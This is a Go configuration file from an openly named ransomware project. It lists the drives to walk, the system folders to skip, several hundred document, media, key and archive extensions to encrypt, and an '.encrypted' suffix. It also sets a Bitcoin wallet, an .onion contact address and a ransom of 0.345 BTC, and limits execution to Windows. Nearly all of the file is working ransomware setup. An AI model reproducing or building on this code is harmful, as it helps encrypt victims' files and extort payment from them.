package cmd

import (
	"fmt"
	"log"
	"os"
	"runtime"
	"sync"

	"github.com/j0nk0/ransomware/cryptofs"
	"github.com/j0nk0/ransomware/utils"
)

var (
	UserDir = fmt.Sprintf("%s\\", utils.GetCurrentUser().HomeDir)

	// Temp Dir
	TempDir = fmt.Sprintf("%s\\", os.Getenv("TEMP"))

	// Directories to walk searching for files
	// By default it will walk throught all available drives
	InterestingDirs = utils.GetDrives()

	// Folders to skip
	SkippedDirs = []string{
		"ProgramData",
		"Windows",
		"bootmgr",
		"$WINDOWS.~BT",
		"Windows.old",
		"Temp",
		"tmp",
		"Program Files",
		"Program Files (x86)",
		"AppData",
		"$Recycle.Bin",
	}

	// Interesting extensions to match files
    InterestingExtensions = []string{
        "1cd", "3d", "3d4", "3df8", "3dm", "3ds", "3g2", "3gp", "3gp2", "3mm", "7z", "8ba", "8bc", "8be", "8bf", "8bi8", "8bl", "8bs", 
        "8bx", "8by", "8li", "aac", "abc", "abk", "abw", "ac3", "accdb", "ace", "acl", "act", "ade", "adi", "adpb", "adr", "adt", "ai", 
        "aif", "aiff", "aim", "aip", "ais", "amf", "amfs", "amr", "amu", "amx", "amxx", "ans", "ap", "ape", "api", "aps*", "arc", "ari", 
        "arj", "aro", "arr", "asa", "asc", "ascx", "ase", "asf", "ashx", "asmx", "asp", "asr", "asx", "avi", "avs", "bak", "bat", "bdp", 
        "bdr", "bi8", "bib", "bic", "big", "bik", "bin", "bkf", "bkp", "bks", "blend", "blp", "bmc", "bmf", "bml", "bmp", "boc", "bp2", 
        "bp3", "bpl", "bsp", "bz2", "c", "cacerts", "cag", "cam", "cap", "car", "cbr", "cbrz", "cbrz7t", "cbz", "cc", "ccd", "cch", "cd", 
        "cdr", "cer", "cert", "cfg", "cgf", "cgi", "chk", "chm", "CHMgz", "class", "clr", "cmf", "cms", "cod", "col", "conf", "cp", "cpp", 
        "crd", "crl", "crt", "cs", "csi", "cso", "csr", "css", "csv", "ctsv", "ctt", "cty", "cwf", "dal", "dap", "dat", "db", "dbb", "dbf", 
        "dbj", "dbsm", "dbx", "dcp", "dcu", "ddc", "ddcx", "dem", "desktop", "dev", "dex", "dic", "dif", "dii", "dir", "disk", "divx", 
        "diz", "djvu", "dll", "dmf", "dmg", "dng", "dob", "doc", "doc*", "docmx", "docx", "dot", "dotm", "dotmx", "dotx", "dox", "dpk", 
        "dpl", "dpr", "dsk", "dsp", "dtx", "dvd", "dvi", "DVIgz", "dvx", "dwg", "dxe", "dxf", "elf", "enc", "eps", "epub", "eql", "err", 
        "euc", "evo", "ex", "exe", "f90", "faq", "far", "fb2", "fcd", "fdfgz", "fdr", "fds", "ff", "fits", "fl", "fla", "flac", "fli", "flp", 
        "flv", "fodp", "fods", "fodt", "for", "fpp", "fxm", "g18", "g3", "gam", "gif", "gkr", "go", "gpg", "gr36", "grf", "gthr", "gz", "gzig", 
        "h", "h3m", "h4r", "htm", "htm*", "html", "ico", "idx", "iif", "img", "indd", "ini", "ink", "ins", "ipa", "iso", "isu", "isz", "it", 
        "itdb", "itl", "iwd", "jar", "jav", "java", "jc", "jceks", "jgz", "jif", "jiff", "jks", "jpc", "jpeg", "jpf", "jpg", "jpw", "js", "json", 
        "key", "kmz", "ks", "kwd", "latex", "lbi", "lcd", "lcf", "ldb", "lgp", ".list", "log", "lp2", "lst", "ltm", "ltr", "ltx", "lua", "lvl", 
        "lzma", "m2ts", "m3u", "m4a", "m4abp", "m4pv", "m4v", "mag", "man", "map", "max", "mbox", "mbx", "mcd", "md", "md0", "md1", "md2", "md3", 
        "mdb", "mdf", "mdl", "mdn", "mds", "meod", "mic", "mid", "midi", "miff", "mip", "mkv", "mlx", "mm6", "mm7", "mm8", "mng", "mobi", "mod", 
        "mov", "moz", "mp234", "mp234c", "mp3", "mp4", "mpa", "mpeg", "mpg", "msg", "msp", "mt2m", "mxp", "nav", "ncd", "nds", "nes", "nfo", "now", 
        "nrg", "nri", "obj", "odc", "odf", "odi", "odm", "odp", "ods", "odt", "oft", "oga", "ogag", "ogagmvx", "ogg", "okta", "okular", "opf", "otp", 
        "ots", "ott", "owl", "oxt", "p10", "p12", "p7b", "pab", "pak", "pbf", "pbgpm", "pbp", "pbs", "pct", "pcv", "pcx", "pdb", "pdd", "pdf", "PDFgz", 
        "pem", "pes", "pfdf", "pfx", "php", "pkb", "pkh", "pkipath", "pl", "plc", "pli", "pls", "pm", "png", "pngm", "pot", "potm", "potmx", "potx", 
        "ppd", "ppf", "pps", "ppsm", "ppsx", "ppt", "ppt*", "pptmx", "pptx", "prc", "prf", "properties", "prt", "ps", "psa", "psd", "pst", "pstm", 
        "puz", "pwf", "pwi", "pxp", "py", "pyc", "qbb", "qdf", "qel", "qif", "qpx", "qt", "qtiq", "qtq", "qtr", "r00", "r01", "r02", "r03", "ra", 
        "ram", "rar", "raw", "rb", "rcp", "res", "rev", "rgb", "rgn", "rle", "rm", "rmi", "rmj", "rng", "rom", "rrt", "rspm", "rsrc", "rsw", "rte", 
        "rtf", "rts", "rtx", "rum", "run", "rv", "s3tm", "sad", "saf", "sav", "scm", "scn", "scx", "sdb", "sdc", "sdn", "sds", "sdt", "sen", "sfs", 
        "sfx", "sgl", "sh", "shar", "shr", "shw", "slt", "smil", "snp", "so", "soconf", "spr", "spx", "sql", "sqlite", "sqx", "srf", "srt", "ssa", 
        "stc", "std", "sti", "stt", "stw", "stx", "sud", "svg", "svi", "svr", "swd", "swf", "sxc", "sxg", "sxi", "sxw", "t01", "t03", "t05", "tar", 
        "tbz2", "tch", "tcx", "texi", "text", "tff", "tg", "tga", "tgz", "thmx", "tif", "tiff", "tlz", "tmp", "tps", "tpu", "tpx", "trp", "tta", "tu", 
        "tur", "txd", "txf", "txt", "uax", "ubr", "udf", "ult", "umx", "unr", "unx", "uop", "upoi", "url", "usa", "usx", "ut2", "ut3", "utc", "utx", 
        "uvx", "uxx", "val", "vc", "vcd", "vdo", "VDRpart", "ver", "vhd", "vim", "viv", "vmf", "vmt", "vob", "vsi", "vtf", "w3g", "w3x", "wad", "war", 
        "wav", "wave", "waw", "wbk", "wdgt", "wks", "wm", "wma", "wmd", "wmdb", "wmmp", "wmv", "wmx", "wow", "wpd", "wpk", "wpl", "wps", "wsh", "wtd", 
        "wtf", "wvx", "x", "x3m", "xbpm", "xl", "xla", "xlam", "xlc", "xll", "xlm", "xlr", "xls", "xls*", "xlsb", "xlsbmx", "xlsx", "xltmx", "xltx", 
        "xlv", "xlw", "xlwx", "xm", "xml", "xpi", "xpm", "xps", "xpt", "xvid", "xwd", "xz", "yab", "yaml", "yps", "yuv", "z02", "z04", "zap", "zip", 
        "zipx", "zoo",
    }


	// Max size allowed to match a file, 20MB by default
	MaxFileSize = int64(200 * 1e+6)

	// Indexer index files and control goroutines execution
	Indexer = struct {
		Files chan *cryptofs.File
		sync.WaitGroup
	}{
		Files: make(chan *cryptofs.File),
	}

	// The logger instance
	Logger = func() *log.Logger {
		// The default destination is os.Stderr, but you can set any io.Writer
		// as the log output. Use ioutil.Discard to ignore the log output
		//
		// Example with a file:
		// f, err := os.OpenFile(TempDir+"example.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
		// handle error...
		// return log.New(f, "optional prefix", log.LstdFlags)
		//
		return log.New(os.Stderr, "", log.LstdFlags)
	}()

	// Workers processing the files
	NumWorkers = runtime.NumCPU()

	// Extension appended to files after encryption
	EncryptionExtension = ".encrypted"

	// Your wallet address
	Wallet = "FD0AhH61ona6fXS62RSQKhNF07Ijx5SBQO"

	// Your contact email
	ContactEmail = "example@ywtpdnpwihbyuvck.onion"

	// The ransom to pay
	Price = "0.345 BTC"
)

// Execute only on windows
func CheckOS() {
	if runtime.GOOS != "windows" {
		Logger.Fatalln("Sorry, but your OS is currently not supported. Try again with a windows machine")
	}
}
